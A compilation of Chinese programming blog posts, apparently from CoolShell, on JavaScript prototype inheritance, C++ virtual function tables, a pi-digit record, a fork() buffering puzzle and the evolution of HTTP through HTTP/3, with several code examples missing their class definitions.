[javascript]   var array1= [ 1,2,3];   [/javascript]数组也是一个对象。   其他关于对象的基本的概念的描述，还是请各位亲们参见陈皓《Javascript 面向对象编程》文章。   对象都有了，唯一没有的就是class，因为在Javascript里面是没有class关键字的，算好还有function，function的存在让我们可以变通的定义类，在扩展这个主题前，我们还需要了解一个Javascript对象最重要的属性， **__proto__** 成员。#### **__proto__成员**严格的说这个成员不应该叫这个名字，__proto__是Firefox中的称呼，__proto__只有在Firefox浏览器中才能被访问到。 **做为一个对象，当你访问其中的一个成员或方法的时候，如果这个对象中没有这个方法或成员，那么Javascript引擎将会访问这个对象的__proto__成员所指向的另外的一个对象，并在那个对象中查找指定的方法或成员，如果不能找到，那就会继续通过那个对象的__proto__成员指向的对象进行递归查找，直到这个链表结束** 。   好了，让我们举一个例子。   比如上上面定义的数组对象array1。当我们创建出array1这个对象的时候，array1实际在Javascript引擎中的对象模型如下：
array1对象具有一个length属性值为3，但是我们可以通过如下的方法来为array1增加元素：[javascript]   array1.push(4);   [/javascript]push这个方法来自于array1的__proto__成员指向对象的一个方法(Array.prototye.push())。正是因为所有的数组对象（通过[]来创建的）都包含有一个指向同一个具有push,reverse等方法对象(Array.prototype)的__proto__成员，才使得这些数组对象可以使用push,reverse等方法。那么这个__proto__这个属性就相当于面向对象中的”has a”关系，这样的的话，只要我们有一个模板对象比如Array.prototype这个对象，然后把其他的对象__proto__属性指向这个对象的话就完成了一种继承的模式。不错！我们完全可以这么干。但是别高兴的太早，这个属性只在FireFox中有效，其他的浏览器虽然也有属性，但是不能通过__proto__来访问，只能通过getPrototypeOf方法进行访问，而且这个属性是只读的。看来我们要在Javascript实现继承并不是很容易的事情啊。
#### **函数对象prototype成员**首先我们先来看一段函数prototype成员的定义，> **When a function object is created, it is given a prototype member which is > an object containing a constructor member which is a reference to the > function object**   > > 当一个函数对象被创建时，这个函数对象就具有一个prototype成员，这个成员是一个对象，这个对象包含了一个构造子成员，这个构造子成员会指向这个函数对象。例如：Base这个函数对象就具有一个prototype成员，关于构造子其实Base函数对象自身，为什么我们将这类函数称为构造子呢？原因是因为这类函数设计来和new 操作符一起使用的。为了和一般的函数对象有所区别，这类函数的首字母一般都大写。构造子的主要作用就是来创建一类相似的对象。上面这段代码在Javascript引擎的对象模型是这样的#### **new 操作符**在有上面的基础概念的介绍之后，在加上new操作符，我们就能完成传统面向对象的class + new的方式创建对象，在Javascript中，我们将这类方式成为Pseudoclassical。   基于上面的例子，我们执行如下代码
[javascript]   var obj = new Base();   [/javascript]这样代码的结果是什么，我们在Javascript引擎中看到的对象模型是：new操作符具体干了什么呢?其实很简单，就干了三件事情。第一行，我们创建了一个空对象obj   第二行，我们将这个空对象的__proto__成员指向了Base函数对象prototype成员对象   第三行，我们将Base函数对象的this指针替换成obj，然后再调用Base函数，于是我们就给obj对象赋值了一个id成员变量，这个成员变量的值是”base”，关于call函数的用法，请参看陈皓《Javascript 面向对象编程》文章   如果我们给Base.prototype的对象添加一些函数会有什么效果呢？   例如代码如下：那么当我们使用new创建一个新对象的时候，根据__proto__的特性，toString这个方法也可以做新对象的方法被访问到。于是我们看到了：   **构造子中，我们来设置‘类’的成员变量（例如：例子中的id），构造子对象prototype中我们来设置‘类’的公共方法。于是通过函数对象和Javascript特有的__proto__与prototype成员及new操作符，模拟出类和类实例化的效果。**
#### **Pseudoclassical 继承**我们模拟类，那么继承又该怎么做呢？其实很简单，我们只要将构造子的prototype指向父类即可。例如我们设计一个Derive 类。如下这段代码执行后的对象模型又是怎么样的呢？根据之前的推导，应该是如下的对象模型这样我们的newObj也继承了基类Base的toString方法，并且具有自身的成员id。关于这个对象模型是如何被推导出来的就留给各位同学了，参照前面的描述，推导这个对象模型应该不难。   Pseudoclassical继承会让学过C++/Java的同学略微的感受到一点舒服，特别是new关键字，看到都特亲切，不过两者虽然相似，但是机理完全不同。当然不关什么样继承都是不能离不开__proto__成员的。#### **Prototypal继承**这是Javascript的另外一种继承方式，这个继承也就是之前陈皓文章《Javascript 面向对象编程》中create函数，非常可惜的是这个是ECMAScript V5的标准，支持V5的浏览器目前看来也就是IE9，Chrome最新版本和Firefox。虽然看着多，但是做为IE6的重灾区的中国，我建议各位还是避免使用create函数。好在没有create函数之前，Javascript的使用者已经设计出了等同于这个函数的。例如：我们看看Douglas Crockford的object函数。
例如如下代码段上面函数的执行后的对象模型是：如何形成这样的对象模型，原理也很简单，只要把object这个函数扩展一下，就能画出这个模型，怎么画留给读者自己去画吧。   这样的继承方式被称为原型继承。相对来说要比Pseudoclassical继承来的简单方便。ECMAScript V5正是因为这原因也才增加create函数，让开发者可以快速的实现原型继承。   上述两种继承方式是Javascript中最常用的继承方式。通过本文的讲解，你应该对Javascript的OO编程有了一些‘原理’级的了解了吧#### **参考:**《Prototypes and Inheritance in JavaScript Prototypes and Inheritance in JavaScript》   Advance Javascript （Douglas Crockford 大神的视频，一定要看啊）#### **题外话：**web2.0后，web应用可谓飞速发展，如今在HTML5发布之际，浏览器的功能被大大强化，我感觉Browser远远在不是一个Browser那么简单了。记得C++之父曾经这样说过JAVA，JAVA不是跨平台，JAVA本身就是一个平台。如今的Browser也本身就是一个平台了，好在这个平台是基于标准的。如果Browser是平台，由于Browser安全沙箱的限制，个人电脑的资源被使用的很少，感觉Browser就是一个NC（Network Computer）？我们居然又回到了Sun最初提出的构想，Sun是不是太强大了些？
# C++ 虚函数表解析作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnC++中的虚函数的作用主要是实现了多态的机制。关于多态，简而言之就是用父类型别的指针指向其子类的实例，然后通过父类的指针调用实际子类的成员函数。这种技术可以让父类的指针有“多种形态”，这是一种泛型技术。所谓泛型技术，说白了就是试图使用不变的代码来实现可变的算法。比如：模板技术，RTTI技术，虚函数技术，要么是试图做到在编译时决议，要么试图做到运行时决议。关于虚函数的使用方法，我在这里不做过多的阐述。大家可以看看相关的C++的书籍。在这篇文章中，我只想从虚函数的实现机制上面为大家 一个清晰的剖析。当然，相同的文章在网上也出现过一些了，但我总感觉这些文章不是很容易阅读，大段大段的代码，没有图片，没有详细的说明，没有比较，没有举一反三。不利于学习和阅读，所以这是我想写下这篇文章的原因。也希望大家多给我提意见。言归正传，让我们一起进入虚函数的世界。目录* 虚函数表   * 一般继承（无虚函数覆盖）   * 一般继承（有虚函数覆盖）   * 多重继承（无虚函数覆盖）   * 多重继承（有虚函数覆盖）   * 安全性     * 一、通过父类型的指针访问子类自己的虚函数     * 二、访问non-public的虚函数   * 结束语     * 附录一：VC中查看虚函数表     * 附录 二：例程
#### 虚函数表对C++ 了解的人都应该知道虚函数（Virtual Function）是通过一张虚函数表（Virtual Table）来实现的。简称为V- Table。在这个表中，主是要一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其容真实反应实际的函数。这样，在有虚函数的类的实例中这个表被分配在了这个实例的内存中，所以，当我们用父类的指针来操作一个子类的时候，这张虚函数表就显得由为重要了，它就像一个地图一样，指明了实际所应该调用的函数。这里我们着重看一下这张虚函数表。C++的编译器应该是保证虚函数表的指针存在于对象实例中最前面的位置（这是为了保证取到虚函数表的有最高的性能——如果有多层继承或是多重继承的情况下）。 这意味着我们通过对象实例的地址得到这张虚函数表，然后就可以遍历其中函数指针，并调用相应的函数。听我扯了那么多，我可以感觉出来你现在可能比以前更加晕头转向了。 没关系，下面就是实际的例子，相信聪明的你一看就明白了。假设我们有这样的一个类：};按照上面的说法，我们可以通过Base的实例来得到虚函数表。 下面是实际例程：typedef void(*Fun)(void);
Base b;Fun pFun = NULL;cout << "虚函数表地址：" << (int*)(&b) << endl;     cout << "虚函数表 — 第一个函数地址：" << (int*)*(int*)(&b) << endl;// Invoke the first virtual function     pFun = (Fun)*((int*)*(int*)(&b));     pFun();实际运行经果如下：(Windows XP+VS2003, Linux 2.6.22 + GCC 4.1.3)虚函数表地址：0012FED4   虚函数表 — 第一个函数地址：0044F148   Base::f通过这个示例，我们可以看到，我们可以通过强行把&b转成int *，取得虚函数表的地址，然后，再次取址就可以得到第一个虚函数的地址了，也就是Base::f()，这在上面的程序中得到了验证（把int* 强制转成了函数指针）。通过这个示例，我们就可以知道如果要调用Base::g()和Base::h()，其代码如下：(Fun)*((int*)*(int*)(&b)+0);  // Base::f()     (Fun)*((int*)*(int*)(&b)+1);  // Base::g()     (Fun)*((int*)*(int*)(&b)+2);  // Base::h()
这个时候你应该懂了吧。什么？还是有点晕。也是，这样的代码看着太乱了。没问题，让我画个图解释一下。如下所示：!01注意：在上面这个图中，我在虚函数表的最后多加了一个结点，这是虚函数表的结束结点，就像字符串的结束符“/0”一样，其标志了虚函数表的结束。这个结束标志的值在不同的编译器下是不同的。在WinXP+VS2003下，这个值是NULL。而在Ubuntu 7.10 + Linux 2.6.22 + GCC 4.1.3下，这个值是如果1，表示还有下一个虚函数表，如果值是0，表示是最后一个虚函数表。下面，我将分别说明“无覆盖”和“有覆盖”时的虚函数表的样子。没有覆盖父类的虚函数是毫无意义的。我之所以要讲述没有覆盖的情况，主要目的是为了给一个对比。在比较之下，我们可以更加清楚地知道其内部的具体实现。#### 一般继承（无虚函数覆盖）下面，再让我们来看看继承时的虚函数表是什么样的。假设有如下所示的一个继承关系：!02请注意，在这个继承关系中，子类没有重载任何父类的函数。那么，在派生类的实例中，其虚函数表如下所示：对于实例：Derive d; 的虚函数表如下：!03我们可以看到下面几点：   1）虚函数按照其声明顺序放于表中。   2）父类的虚函数在子类的虚函数前面。
我相信聪明的你一定可以参考前面的那个程序，来编写一段程序来验证。#### 一般继承（有虚函数覆盖）覆盖父类的虚函数是很显然的事情，不然，虚函数就变得毫无意义。下面，我们来看一下，如果子类中有虚函数重载了父类的虚函数，会是一个什么样子？假设，我们有下面这样的一个继承关系。!04为了让大家看到被继承过后的效果，在这个类的设计中，我只覆盖了父类的一个函数：f()。那么，对于派生类的实例，其虚函数表会是下面的一个样子：!05我们从表中可以看到下面几点，   1）覆盖的f()函数被放到了虚表中原来父类虚函数的位置。   2）没有被覆盖的函数依旧。这样，我们就可以看到对于下面这样的程序，Base *b = new Derive();b->f();由b所指的内存中的虚函数表的f()的位置已经被Derive::f()函数地址所取代，于是在实际调用发生时，是Derive::f()被调用了。这就实现了多态。#### 多重继承（无虚函数覆盖）下面，再让我们来看看多重继承中的情况，假设有下面这样一个类的继承关系。注意：子类并没有覆盖父类的函数。!06对于子类实例中的虚函数表，是下面这个样子：!07我们可以看到：   1） 每个父类都有自己的虚表。   2） 子类的成员函数被放到了第一个父类的表中。（所谓的第一个父类是按照声明顺序来判断的）
这样做就是为了解决不同的父类类型的指针指向同一个子类实例，而能够调用到实际的函数。#### 多重继承（有虚函数覆盖）下面我们再来看看，如果发生虚函数覆盖的情况。!08下图中，我们在子类中覆盖了父类的f()函数。!09下面是对于子类实例中的虚函数表的图：我们可以看见，三个父类虚函数表中的f()的位置被替换成了子类的函数指针。这样，我们就可以任一静态类型的父类来指向子类，并调用子类的f()了。如：Derive d;     Base1 *b1 = &d;     Base2 *b2 = &d;     Base3 *b3 = &d;     b1->f(); //Derive::f()     b2->f(); //Derive::f()     b3->f(); //Derive::f()b1->g(); //Base1::g()     b2->g(); //Base2::g()     b3->g(); //Base3::g()#### 安全性每次写C++的文章，总免不了要批判一下C++。这篇文章也不例外。通过上面的讲述，相信我们对虚函数表有一个比较细致的了解了。水可载舟，亦可覆舟。下面，让我们来看看我们可以用虚函数表来干点什么坏事吧。
##### 一、通过父类型的指针访问子类自己的虚函数我们知道，子类没有重载父类的虚函数是一件毫无意义的事情。因为多态也是要基于函数重载的。虽然在上面的图中我们可以看到Base1的虚表中有Derive的虚函数，但我们根本不可能使用下面的语句来调用子类的自有虚函数：Base1 *b1 = new Derive();     b1->f1();  //编译出错任何妄图使用父类指针想调用子类中的 **未覆盖父类的成员函数** 的行为都会被编译器视为非法，所以，这样的程序根本无法编译通过。但在运行时，我们可以通过指针的方式访问虚函数表来达到违反C++语义的行为。（关于这方面的尝试，通过阅读后面附录的代码，相信你可以做到这一点）##### 二、访问non-public的虚函数另外，如果父类的虚函数是private或是protected的，但这些非public的虚函数同样会存在于虚函数表中，所以，我们同样可以使用访问虚函数表的方式来访问这些non- public的虚函数，这是很容易做到的。如：};};typedef void(*Fun)(void);#### 结束语C++这门语言是一门Magic的语言，对于程序员来说，我们似乎永远摸不清楚这门语言背着我们在干了什么。需要熟悉这门语言，我们就必需要了解C++里面的那些东西，需要去了解C++中那些危险的东西。不然，这是一种搬起石头砸自己脚的编程语言。
##### 附录一：VC中查看虚函数表我们可以在VC的IDE环境中的Debug状态下展开类的实例就可以看到虚函数表了（并不是很完整的）##### 附录 二：例程下面是一个关于多重继承的虚函数表访问的例程：};typedef void(*Fun)(void);Derive d;     int** pVtab = (int**)&d;//Base1's vtable     //pFun = (Fun)*((int*)*(int*)((int*)&d+0)+0);     pFun = (Fun)pVtab[0][0];     pFun();//pFun = (Fun)*((int*)*(int*)((int*)&d+0)+1);     pFun = (Fun)pVtab[0][1];     pFun();//pFun = (Fun)*((int*)*(int*)((int*)&d+0)+2);     pFun = (Fun)pVtab[0][2];     pFun();//Derive's vtable     //pFun = (Fun)*((int*)*(int*)((int*)&d+0)+3);     pFun = (Fun)pVtab[0][3];     pFun();
//The tail of the vtable     pFun = (Fun)pVtab[0][4];     cout<<pFun<<endl;//Base2's vtable     //pFun = (Fun)*((int*)*(int*)((int*)&d+1)+0);     pFun = (Fun)pVtab[1][0];     pFun();//pFun = (Fun)*((int*)*(int*)((int*)&d+1)+1);     pFun = (Fun)pVtab[1][1];     pFun();pFun = (Fun)pVtab[1][2];     pFun();//The tail of the vtable     pFun = (Fun)pVtab[1][3];     cout<<pFun<<endl;//Base3's vtable     //pFun = (Fun)*((int*)*(int*)((int*)&d+1)+0);     pFun = (Fun)pVtab[2][0];     pFun();//pFun = (Fun)*((int*)*(int*)((int*)&d+1)+1);     pFun = (Fun)pVtab[2][1];     pFun();
pFun = (Fun)pVtab[2][2];     pFun();//The tail of the vtable     pFun = (Fun)pVtab[2][3];     cout<<pFun<<endl;return 0;     }**注：本文年代久远，所有的示例都是在32位机上跑的。**(全文完)# PI小数点位数的新纪录作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnPI小数点后的位数据个数据的纪录被刷新了，被一台PC机刷新的。新的纪录把PI的小点数后面的位数整到了近2.7万亿位，太BT了。下面的链接是本次经录的通告：这个通告宣称：* PI后的小数点位数被计算到了2,699,999,990,000位。* 为了保存计算结果，一共花了，1137GB的硬盘空间。* 本次计算使用了价值2000欧元左右的PC机，CPU是Core i7 CPU at 2.93 GHz ，内存6GB，5个1.5TB的希捷硬盘。* 操作系统使用的是Linux 64 bit Red Hat Fedora 10 distribution，7.5TB的硬盘被做成了RAID-0阵列，使用了ext4文件系统。
* 整个计算时间花了131天（4个半月），其中，103天用于计算PI的二进制结果，13天用于验证二进制结果，花了12天把二进制转成十进制，最后花了3天再验证了转换。* 上一次的记录是2.577 万亿小数位，于2009年8月17日创造。其使用了超过百万欧元的超级计算机（Appro Xtreme-X3 Server）。相关的技术细节请看这里：我想了想，算这个玩意花了多少度电，产生了多少废气，太不环保了。呵呵。# 一个fork的面试题作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn前两天有人问了个关于Unix的fork()系统调用的面试题，这个题正好是我大约十年前找工作时某公司问我的一个题，我觉得比较有趣，写篇文章与大家分享一下。这个题是这样的：**题目：请问下面的程序一共输出多少个“-”？**wait(NULL);     wait(NULL);return 0;     }如果你对fork()的机制比较熟悉的话，这个题并不难，输出应该是6个“-”，但是，实际上这个程序会很tricky地输出8个“-”。要讲清这个题，我们首先需要知道fork()系统调用的特性，
* fork()系统调用是Unix下以自身进程创建子进程的系统调用，一次调用，两次返回，如果返回是0，则是子进程，如果返回值>0，则是父进程（返回值是子进程的pid），这是众为周知的。* 还有一个很重要的东西是，在fork()的调用处，整个父进程空间会原模原样地复制到子进程中，包括指令，变量值，程序调用栈，环境变量，缓冲区，等等。所以，上面的那个程序为什么会输入8个“-”，这是因为printf(“-“);语句有buffer，所以，对于上述程序，printf(“-“);把“-”放到了缓存中，并没有真正的输出（参看《C语言的迷题》中的第一题）， **在fork的时候，缓存被复制到了子进程空间** ，所以，就多了两个，就成了8个，而不是6个。另外，多说一下，我们知道，Unix下的设备有“块设备”和“字符设备”的概念，所谓块设备，就是以一块一块的数据存取的设备，字符设备是一次存取一个字符的设备。磁盘、内存都是块设备，字符设备如键盘和串口。 **块设备一般都有缓存，而字符设备一般都没有缓存** 。对于上面的问题，我们如果修改一下上面的printf的那条语句为：`printf("-\n");`或是printf("-");     fflush(stdout);
就没有问题了（就是6个“-”了），因为程序遇到“\n”，或是EOF，或是缓中区满，或是文件描述符关闭，或是主动flush，或是程序退出，就会把数据刷出缓冲区。需要注意的是，标准输出是行缓冲，所以遇到“\n”的时候会刷出缓冲区，但对于磁盘这个块设备来说，“\n”并不会引起缓冲区刷出的动作，那是全缓冲，你可以使用setvbuf来设置缓冲区大小，或是用fflush刷缓存。我估计有些朋友可能对于fork()还不是很了解，那么我们把上面的程序改成下面这样：于是，上面这段程序会输出下面的结果，（注：编译出的可执行的程序名为fork）ppid=8858, pid=8518, i=0     ppid=8858, pid=8518, i=1     ppid=8518, pid=8519, i=0     ppid=8518, pid=8519, i=1     ppid=8518, pid=8520, i=1     ppid=8519, pid=8521, i=1$ pstree -p | grep fork     |-bash(8858)-+-fork(8518)-+-fork(8519)---fork(8521)     |            |            `-fork(8520)
面对这样的图你可能还是看不懂，没事，我好事做到底，画个图给你看看：注意：上图中的我用了几个色彩，相同颜色的是同一个进程。于是，我们的pstree的图示就可以成为下面这个样子：（下图中的颜色与上图对应）这样，对于printf(“-“);这个语句，我们就可以很清楚的知道，哪个子进程复制了父进程标准输出缓中区里的的内容，而导致了多次输出了。（如下图所示，就是我阴影并双边框了那两个子进程）现在你明白了吧。（另，对于图中的我本人拙劣的配色，请见谅!）（全文完）# HTTP的前世今生作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnHTTP (Hypertext transfer protocol) 翻译成中文是超文本传输协议，是互联网上重要的一个协议，由欧洲核子研究委员会CERN的英国工程师 Tim Berners- Lee v发明的，同时，他也是WWW的发明人，最初的主要是用于传递通过HTML封装过的数据。在1991年发布了HTTP 0.9版，在1996年发布1.0版，1997年是1.1版，1.1版也是到今天为止传输最广泛的版本（初始RFC 2068 在1997年发布， 然后在1999年被 RFC 2616 取代，再在2014年被 RFC 7230 /7231/7232/7233/7234/7235取代），2015年发布了2.0版，其极大的优化了HTTP/1.1的性能和安全性，而2018年发布的3.0版，继续优化HTTP/2，激进地使用UDP取代TCP协议，目前，HTTP/3 在2019年9月26日 被 Chrome，Firefox，和Cloudflare支持，所以我想写下这篇文章，简单地说一下HTTP的前世今生，让大家学到一些知识，并希望可以在推动一下HTTP标准协议的发展。
目录* HTTP 0.9 / 1.0   * HTTP/1.1   * HTTP/2   * HTTP/3#### HTTP 0.9 / 1.00.9和1.0这两个版本，就是最传统的 request – response的模式了，HTTP 0.9版本的协议简单到极点，请求时，不支持请求头，只支持 `GET` 方法，没了。HTTP 1.0 扩展了0.9版，其中主要增加了几个变化：* 在请求中加入了HTTP版本号，如：`GET /coolshell/index.html HTTP/1.0`   * HTTP 开始有 header了，不管是request还是response 都有header了。   * 增加了HTTP Status Code 标识相关的状态码。   * 还有 `Content-Type` 可以传输其它的文件了。我们可以看到，HTTP 1.0 开始让这个协议变得很文明了，一种工程文明。因为：* 一个协议有没有版本管理，是一个工程化的象征。   * header是协议可以说是把元数据和业务数据解耦，也可以说是控制逻辑和业务逻辑的分离。   * Status Code 的出现可以让请求双方以及第三方的监控或管理程序有了统一的认识。最关键是还是控制错误和业务错误的分离。
（注：国内很多公司HTTP无论对错只返回200，这种把HTTP Status Code 全部抹掉完全是一种工程界的倒退）但是，HTTP1.0性能上有一个很大的问题，那就是每请求一个资源都要新建一个TCP链接，而且是串行请求，所以，就算网络变快了，打开网页的速度也还是很慢。所以，HTTP 1.0 应该是一个必需要淘汰的协议了。####  HTTP/1.1HTTP/1.1 主要解决了HTTP 1.0的网络性能的问题，以及增加了一些新的东西：* 可以设置 `keepalive` 来让HTTP重用TCP链接，重用TCP链接可以省了每次请求都要在广域网上进行的TCP的三次握手的巨大开销。这是所谓的“ **HTTP 长链接** ” 或是 “ **请求响应式的HTTP 持久链接** ”。英文叫 HTTP Persistent connection.   * 然后支持pipeline网络传输，只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以减少整体的响应时间。（注：非幂等的POST 方法或是有依赖的请求是不能被pipeline化的）   * 支持 Chunked Responses ，也就是说，在Response的时候，不必说明 `Content-Length` 这样，客户端就不能断连接，直到收到服务端的EOF标识。这种技术又叫 “ **服务端Push模型** ”，或是 “ **服务端Push式的HTTP 持久链接** ”   * 还增加了 cache control 机制。   * 协议头注增加了 Language, Encoding, Type 等等头，让客户端可以跟服务器端进行更多的协商。   * 还正式加入了一个很重要的头—— `HOST`这样的话，服务器就知道你要请求哪个网站了。因为可以有多个域名解析到同一个IP上，要区分用户是请求的哪个域名，就需要在HTTP的协议中加入域名的信息，而不是被DNS转换过的IP信息。   * 正式加入了 `OPTIONS` 方法，其主要用于 CORS – Cross Origin Resource Sharing 应用。
HTTP/1.1应该分成两个时代，一个是2014年前，一个是2014年后，因为2014年HTTP/1.1有了一组RFC（7230 /7231/7232/7233/7234/7235），这组RFC又叫“HTTP/2 预览版”。其中影响HTTP发展的是两个大的需求：* 一个需要是加大了HTTP的安全性，这样就可以让HTTP应用得广泛，比如，使用TLS协议。   * 另一个是让HTTP可以支持更多的应用，在HTTP/1.1 下，HTTP已经支持四种网络协议：      * 传统的短链接。     * 可重用TCP的的长链接模型。     * 服务端push的模型。     * WebSocket模型。自从2005年以来，整个世界的应用API越来多，这些都造就了整个世界在推动HTTP的前进，我们可以看到， **自2014的HTTP/1.1 以来，这个世界基本的应用协议的标准基本上都是向HTTP看齐了，也许2014年前，还有一些专用的RPC协议，但是2014年以后，HTTP协议的增强，让我们实在找不出什么理由不向标准靠拢，还要重新发明轮子了。**#### HTTP/2虽然 HTTP/1.1 已经开始变成应用层通讯协议的一等公民了，但是还是有性能问题，虽然HTTP/1.1 可以重用TCP链接，但是请求还是一个一个串行发的，需要保证其顺序。然而，大量的网页请求中都是些资源类的东西，这些东西占了整个HTTP请求中最多的传输数据量。所以，理论上来说，如果能够并行这些请求，那就会增加更大的网络吞吐和性能。
另外，HTTP/1.1传输数据时，是以文本的方式，借助耗CPU的zip压缩的方式减少网络带宽，但是耗了前端和后端的CPU。这也是为什么很多RPC协议诟病HTTP的一个原因，就是数据传输的成本比较大。其实，在2010年时，Google 就在搞一个实验型的协议，这个协议叫SPDY，这个协议成为了HTTP/2的基础（也可以说成HTTP/2就是SPDY的复刻）。HTTP/2基本上解决了之前的这些性能问题，其和HTTP/1.1最主要的不同是：* HTTP/2是一个二进制协议，增加了数据传输的效率。   * HTTP/2是可以在一个TCP链接中并发请求多个HTTP请求，移除了HTTP/1.1中的串行请求。   * HTTP/2会压缩头，如果你同时发出多个请求，他们的头是一样的或是相似的，那么，协议会帮你消除重复的部分。这就是所谓的HPACK算法（参看RFC 7541 附录A）   * HTTP/2允许服务端在客户端放cache，又叫服务端push，也就是说，你没有请求的东西，我服务端可以先送给你放在你的本地缓存中。比如，你请求X，我服务端知道X依赖于Y，虽然你没有的请求Y，但我把把Y跟着X的请求一起返回客户端。
对于这些性能上的改善，在Medium上有篇文章你可看一下相关的细节说明和测试“HTTP/2: the difference between HTTP/1.1, benefits and how to use it”当然，还需要注意到的是HTTP/2的协议复杂度比之前所有的HTTP协议的复杂度都上升了许多许多，其内部还有很多看不见的东西，比如其需要维护一个“优先级树”来用于来做一些资源和请求的调度和控制。如此复杂的协议，自然会产生一些不同的声音，或是降低协议的可维护和可扩展性。所以也有一些争议。尽管如此，HTTP/2还是很快地被世界所采用。HTTP/2 是2015年推出的，其发布后，Google 宣布移除对SPDY的支持，拥抱标准的 HTTP/2。过了一年后，就有8.7%的网站开启了HTTP/2，根据 这份报告 ，截止至本文发布时（2019年10月1日 ）， 在全世界范围内已经有41%的网站开启了HTTP/2。HTTP/2的官方组织在 Github 上维护了一份各种语言对HTTP/2的实现列表，大家可以去看看。我们可以看到，HTTP/2 在性能上对HTTP有质的提高，所以，HTTP/2 被采用的也很快，所以， **如果你在你的公司内负责架构的话，HTTP/2是你一个非常重要的需要推动的一个事，除了因为性能上的问题，推动标准落地也是架构师的主要职责，因为，你企业内部的架构越标准，你可以使用到开源软件，或是开发方式就会越有效率，跟随着工业界的标准的发展，你的企业会非常自然的享受到标准所带来的红利。**
#### HTTP/3然而，这个世界没有完美的解决方案，HTTP/2也不例外，其主要的问题是：若干个HTTP的请求在复用一个TCP的连接，底层的TCP协议是不知道上层有多少个HTTP的请求的，所以，一旦发生丢包，造成的问题就是所有的HTTP请求都必需等待这个丢了的包被重传回来，哪怕丢的那个包不是我这个HTTP请求的。因为TCP底层是没有这个知识了。这个问题又叫Head-of-Line Blocking问题，这也是一个比较经典的流量调度的问题。这个问题最早主要的发生的交换机上。下图来自Wikipedia。图中，左边的是输入队列，其中的1，2，3，4表示四个队列，四个队列中的1，2，3，4要去的右边的output的端口号。此时，第一个队列和第三个队列都要写右边的第四个端口，然后，一个时刻只能处理一个包，所以，一个队列只能在那等另一个队列写完后。然后，其此时的3号或1号端口是空闲的，而队列中的要去1和3号端号的数据，被第四号端口给block住了。这就是所谓的HOL blocking问题。HTTP/1.1中的pipeline中如果有一个请求block了，那么队列后请求也统统被block住了；HTTP/2 多请求复用一个TCP连接，一旦发生丢包，就会block住所有的HTTP请求。这样的问题很讨厌。好像基本无解了。
是的TCP是无解了，但是UDP是有解的 ！ **于是HTTP/3破天荒地把HTTP底层的TCP协议改成了UDP！**然后又是Google 家的协议进入了标准 – QUIC （Quick UDP Internet Connections）。接下来是QUIC协议的几个重要的特性，为了讲清楚这些特性，我需要带着问题来讲（注：下面的网络知识，如果你看不懂的话，你需要学习一下《TCP/IP详解》一书（在我写blog的这15年里，这本书推荐了无数次了），或是看一下本站的《TCP的那些事》。）：* 首先是上面的Head-of-Line blocking问题，在UDP的世界中，这个就没了。这个应该比较好理解，因为UDP不管顺序，不管丢包（当然，QUIC的一个任务是要像TCP的一个稳定，所以QUIC有自己的丢包重传的机制）   * TCP是一个无私的协议，也就是说，如果网络上出现拥塞，大家都会丢包，于是大家都会进入拥塞控制的算法中，这个算法会让所有人都“冷静”下来，然后进入一个“慢启动”的过程，包括在TCP连接建立时，这个慢启动也在，所以导致TCP性能迸发地比较慢。QUIC基于UDP，使用更为激进的方式。同时，QUIC有一套自己的丢包重传和拥塞控制的协，一开始QUIC是重新实现一TCP 的 CUBIC算法，但是随着BBR算法的成熟（BBR也在借鉴CUBIC算法的数学模型），QUIC也可以使用BBR算法。这里，多说几句， **从模型来说，以前的TCP的拥塞控制算法玩的是数学模型，而新型的TCP拥塞控制算法是以BBR为代表的测量模型** ，理论上来说，后者会更好，但QUIC的团队在一开始觉得BBR不如CUBIC的算法好，所以没有用。现在的BBR 2.x借鉴了CUBIC数学模型让拥塞控制更公平。这里有文章大家可以一读“TCP BBR : Magic dust for network performance.”   * 接下来，现在要建立一个HTTPS的连接，先是TCP的三次握手，然后是TLS的三次握手，要整出六次网络交互，一个链接才建好，虽说HTTP/1.1和HTTP/2的连接复用解决这个问题，但是基于UDP后，UDP也得要实现这个事。于是QUIC直接把TCP的和TLS的合并成了三次握手（对此，在HTTP/2的时候，是否默认开启TLS业内是有争议的，反对派说，TLS在一些情况下是不需要的，比如企业内网的时候，而支持派则说，TLS的那些开销，什么也不算了）。
|---|---所以，QUIC是一个在UDP之上的伪TCP +TLS +HTTP/2的多路复用的协议。但是对于UDP还是有一些挑战的，这个挑战主要来自互联网上的各种网络设备，这些设备根本不知道是什么QUIC，他们看QUIC就只能看到的就是UDP，所以，在一些情况下，UDP就是有问题的，* 比如在NAT的环境下，如果是TCP的话，NAT路由或是代理服务器，可以通过记录TCP的四元组（源地址、源端口，目标地址，目标端口）来做连接映射的，然而，在UDP的情况下不行了。于是，QUIC引入了个叫connection id的不透明的ID来标识一个链接，用这种业务ID很爽的一个事是，如果你从你的3G/4G的网络切到WiFi网络（或是反过来），你的链接不会断，因为我们用的是connection id，而不是四元组。* 然而就算引用了connection id，也还是会有问题 ，比如一些不够“聪明”的等价路由交换机，这些交换机会通过四元组来做hash把你的请求的IP转到后端的实际的服务器上，然而，他们不懂connection id，只懂四元组，这么导致属于同一个connection id但是四元组不同的网络包就转到了不同的服务器上，这就是导致数据不能传到同一台服务器上，数据不完整，链接只能断了。所以，你需要更聪明的算法（可以参看 Facebook 的 Katran 开源项目 ）
